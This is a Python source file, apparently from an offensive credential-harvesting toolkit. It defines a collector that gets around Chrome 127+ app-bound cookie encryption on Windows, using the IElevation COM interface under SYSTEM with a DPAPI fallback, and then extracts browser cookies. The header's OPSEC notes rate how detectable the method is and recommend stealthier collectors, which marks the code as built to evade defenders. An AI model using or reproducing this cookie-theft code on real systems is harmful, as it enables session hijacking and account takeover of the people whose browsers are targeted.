"""Chrome app-bound encryption collector (Windows, Chrome 127+).

Chrome 127 introduced app-bound encryption on Windows: cookies with the v20
prefix are encrypted with a key that is itself protected by Chrome's IElevation
COM interface (CLSID {708860E0-F641-4611-8895-7D867DD3675B}).

This collector:
  1. Discovers whether the local Chrome installation uses app-bound encryption
  2. Attempts to decrypt cookies using the IElevation COM path (SYSTEM only)
  3. Falls back to standard DPAPI for v10 cookies if v20 decryption fails
  4. Reports clear diagnostics about what worked and what didn't

OPSEC:
  - stealth_score=3: COM activation + SYSTEM context are detectable via ETW
  - Prefer cdp_cookies collector (stealth_score=4) when Chrome is available
  - Standard DPAPI extraction (stealth_score=5) still works for v10 cookies
"""

from __future__ import annotations

import json
from typing import List

from ..base import BaseCollector
from .. import CollectorRegistry
from ...types import CollectedToken, DiscoveredToken
from ...platform_utils import chrome_user_data_dir
from ...core.chromium_decrypt import (
    DecryptError,
    _read_local_state,
    _try_app_bound_key_windows,
    detect_chrome_version,
    extract_cookies,
    get_chrome_key,
    is_app_bound_encryption,
)


def _version_str(version: tuple) -> str:
    """Format a version tuple as a dotted string."""
    return ".".join(str(x) for x in version)


@CollectorRegistry.register
class AppBoundDecryptCollector(BaseCollector):
    """Chrome app-bound encryption cookie collector (Windows, Chrome 127+).

    Attempts to decrypt v20 app-bound cookies via IElevation COM when running
    as SYSTEM.  Falls back to standard DPAPI for v10 cookies.  Reports clear
    diagnostics about the encryption state.
    """

    service = "chrome"
    source = "app_bound_decrypt"
    platforms = ["windows"]
    stealth_score = 3

    def discover(self) -> List[DiscoveredToken]:
        """Detect Chrome 127+ app-bound encryption on Windows."""
        chrome_dir = chrome_user_data_dir()
        if not chrome_dir.exists():
            return []

        version = detect_chrome_version()
        if version is None:
            return [DiscoveredToken(
                service=self.service,
                source=self.source,
                path=str(chrome_dir),
                account_hint="",
                stealth_score=self.stealth_score,
                details="Chrome version unknown — cannot determine encryption type",
            )]

        ver_str = _version_str(version)

        if not is_app_bound_encryption(version):
            return [DiscoveredToken(
                service=self.service,
                source=self.source,
                path=str(chrome_dir),
                account_hint="",
                stealth_score=self.stealth_score,
                details=(
                    f"Chrome {ver_str} — no app-bound encryption "
                    f"(v20 starts at Chrome 127+)"
                ),
            )]

        # Use cached Local State to check for app_bound_encrypted_key
        data = _read_local_state()
        has_app_key = bool(
            data.get("os_crypt", {}).get("app_bound_encrypted_key")
        ) if data else False

        details = f"Chrome {ver_str} — app-bound encryption active"
        if has_app_key:
            details += "; app_bound_encrypted_key present in Local State"
        else:
            details += "; app_bound_encrypted_key NOT found (unexpected)"

        return [DiscoveredToken(
            service=self.service,
            source=self.source,
            path=str(chrome_dir),
            account_hint="v20 app-bound cookies",
            stealth_score=self.stealth_score,
            details=details,
        )]

    def collect(self) -> List[CollectedToken]:
        """Extract cookies, attempting app-bound decryption for v20.

        Strategy:
          1. Try IElevation COM for app-bound key (requires SYSTEM)
          2. Always get standard DPAPI key for v10 fallback
          3. Extract cookies using whichever key(s) are available
        """
        version = detect_chrome_version()
        if version is None:
            self._warn("Cannot determine Chrome version")
            return []

        ver_str = _version_str(version)

        if not is_app_bound_encryption(version):
            self._info(
                f"Chrome {ver_str} does not use app-bound encryption; "
                f"use standard collectors instead"
            )
            return []

        # Try to get the app-bound key (SYSTEM only)
        app_key = _try_app_bound_key_windows()
        app_key_ok = app_key is not None

        # Always get the standard DPAPI key for v10 fallback
        dpapi_key = None
        try:
            dpapi_key = get_chrome_key()
        except DecryptError as e:
            self._warn(f"Standard DPAPI key extraction failed: {e}")

        if not app_key_ok and dpapi_key is None:
            self._warn(
                f"Chrome {ver_str}: both app-bound and DPAPI key extraction "
                f"failed. Use cdp_cookies collector instead."
            )
            return []

        # Use whichever key we have (prefer app-bound for v20 cookies)
        primary_key = app_key if app_key_ok else dpapi_key

        try:
            cookies = extract_cookies(key=primary_key)
        except DecryptError as e:
            self._warn(f"Cookie extraction failed: {e}")
            return []

        if not cookies:
            self._info("No cookies extracted")
            return []

        method = "app_bound_ielevation" if app_key_ok else "dpapi_v10_only"

        self._info(
            f"Extracted {len(cookies)} cookies from Chrome {ver_str} "
            f"(method={method})"
        )

        return [CollectedToken(
            service=self.service,
            source=self.source,
            stealth_score=self.stealth_score,
            extra={
                "chrome_version": ver_str,
                "extraction_method": method,
                "app_bound_key_available": app_key_ok,
                "dpapi_key_available": dpapi_key is not None,
                "cookie_count": len(cookies),
                "cookies": {
                    c["name"]: {
                        "host": c["host"],
                        "value_preview": c["value"][:8] + "..." if c["value"] else "",
                        "secure": c["secure"],
                        "httponly": c["httponly"],
                    }
                    for c in cookies[:50]  # Cap preview at 50 cookies
                },
            },
        )]
